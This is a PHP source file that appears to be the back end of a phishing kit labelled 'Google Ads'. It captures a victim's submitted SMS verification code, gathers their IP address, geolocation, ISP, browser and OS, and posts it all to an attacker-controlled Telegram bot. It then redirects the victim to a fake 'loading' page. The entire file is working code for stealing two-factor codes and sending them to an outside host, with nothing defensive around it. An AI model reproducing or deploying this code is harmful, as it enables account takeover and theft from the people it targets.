<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

$local_userAgent = isset($_SERVER["HTTP_USER_AGENT"])
    ? $_SERVER["HTTP_USER_AGENT"]
    : "";
$local_time = date("Y-m-d H:i:s");
$local_domain = $_SERVER["SERVER_NAME"];
$local_os = get_platform($local_userAgent);
$local_browser = get_browser_value($local_userAgent);
global  $local_userAgent, $local_time, $local_domain, $local_os, $local_browser;

function get_platform($USER_AGENT)
{
    $OS_ERROR = "Unknown OS Platform";
    $OS = [
        "/windows nt 11/i" => "Windows 11",
        "/windows nt 10/i" => "Windows 10",
        "/windows nt 6.3/i" => "Windows 8.1",
        "/windows nt 6.2/i" => "Windows 8",
        "/windows nt 6.1/i" => "Windows 7",
        "/windows nt 6.0/i" => "Windows Vista",
        "/windows nt 5.2/i" => "Windows Server 2003/XP x64",
        "/windows nt 5.1/i" => "Windows XP",
        "/windows xp/i" => "Windows XP",
        "/windows nt 5.0/i" => "Windows 2000",
        "/windows me/i" => "Windows ME",
        "/win98/i" => "Windows 98",
        "/win95/i" => "Windows 95",
        "/win16/i" => "Windows 3.11",
        "/macintosh|mac os x/i" => "Mac OS X",
        "/mac_powerpc/i" => "Mac OS 9",
        "/linux/i" => "Linux",
        "/ubuntu/i" => "Ubuntu",
        "/iphone/i" => "iPhone",
        "/ipod/i" => "iPod",
        "/ipad/i" => "iPad",
        "/android/i" => "Android",
        "/blackberry/i" => "BlackBerry",
        "/webos/i" => "Mobile",
    ];
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }
    }
    return $OS_ERROR;
}
function get_browser_value($USER_AGENT)
{
    $BROWSER_ERROR = "Unknown Browser";
    $BROWSER = [
        "/msie/i" => "Internet Explorer",
        "/firefox/i" => "Firefox",
        "/safari/i" => "Safari",
        "/chrome/i" => "Chrome",
        "/edge/i" => "Edge",
        "/opera/i" => "Opera",
        "/netscape/i" => "Netscape",
        "/maxthon/i" => "Maxthon",
        "/konqueror/i" => "Konqueror",
        "/mobile/i" => "Handheld Browser",
    ];
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
function getClientIP()
{
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        $ipAddress = $_SERVER["REMOTE_ADDR"];
    }

    $validIPs = [];
    $ipMatches = preg_match_all(
        "/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/",
        $ipAddress,
        $matches
    );

    if ($ipMatches) {
        $validIPs = $matches[0];
    }

    if (!empty($validIPs)) {
        $_SESSION["session_ip"] = $validIPs[0];
        return $validIPs[0];
    } else {
        $_SESSION["session_ip"] = "127.0.0.1";
        return "127.0.0.1";
    }
}	
function fetchIPInfo($ipAddress)
{
    $url = "http://ip-api.com/php/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    $info = unserialize($response);
    $_SESSION["session_isp"] = isset($info["isp"]) ? $info["isp"] : null;
    $_SESSION["session_country"] = isset($info["country"])
        ? $info["country"]
        : null;
    $_SESSION["session_country_code"] = isset($info["countryCode"])
        ? $info["countryCode"]
        : null;
    $_SESSION["session_city"] = isset($info["city"]) ? $info["city"] : null;
    $_SESSION["session_region"] = isset($info["region"])
        ? $info["region"]
        : null;
    $proxy = isset($info["proxy"]) ? $info["proxy"] : null;
    $_SESSION["session_proxy"] = $proxy == 1 ? "True" : "False";
    $mobile = isset($info["mobile"]) ? $info["mobile"] : null;
    $_SESSION["session_mobile"] = $mobile == 1 ? "True" : "False";
    $hosting = isset($info["hosting"]) ? $info["hosting"] : null;
    $_SESSION["session_hosting"] = $hosting == 1 ? "True" : "False";
}
function tele_message($message)
{
	if(isset($_COOKIE['idtel']) && isset($_COOKIE['tokentel'])){
       $TrubFtub = $_COOKIE['idtel'];
       $cRetVckr = $_COOKIE['tokentel'];
    } else {
       $TrubFtub = '';
       $cRetVckr = '';
    }
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
function up_file_log($content)
{
    $filePath = 'log.txt';
    $content .= "\n";
    if (file_exists($filePath))
    {
        $existingContent = file_get_contents($filePath);
        $newContent = $content . $existingContent;
        file_put_contents($filePath, $newContent);
    }
    else
    {
        $file = fopen($filePath, 'w');
        if ($file) {
            fwrite($file, $content);
            fclose($file);
        } else {
            echo "Failed to open the file.";
        }
    }
}

if ($_SERVER["REQUEST_METHOD"] === "POST")
{
	$sms = $_POST['data_sms_code'];
	
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = isset($matches[1]) ? $matches[1] : '';
    $url = "https://$domain/web/api.php?userid=$folderName";
	
    $ipaddress = getClientIP();
    fetchIPInfo($ipaddress);
	if(isset($_SESSION["session_country_code"])){
      $country_code = strtoupper($_SESSION["session_country_code"]);
    } else {
      $country_code = 'NA';
    }
	$subscibe = "Google Ads - ($country_code)";
    $country = $_SESSION["session_country"];
    $isp = $_SESSION["session_isp"];
    $city = $_SESSION["session_city"];
    $proxy = $_SESSION["session_proxy"];
    $local_time = date("Y-m-d H:i:s");	
    $message = "
➡️ 🆂🅼🆂
--------------------------------------------
📱  𝗦𝗠𝗦 𝗖𝗢𝗗𝗘: $sms
--------------------------------------------
🌐  𝗣𝗮𝗻𝗲𝗹 𝗨𝗥𝗟:: {$url}
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
";	
    $blank_page = $subscibe;
	up_file_log("User Send SMS code to Telegram|$subscibe|OK $local_time");
    $up_file = fopen("project.txt", "w");
    fwrite($up_file, $blank_page);
    tele_message($message);
    $blank_page = '';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
	
	
}

?>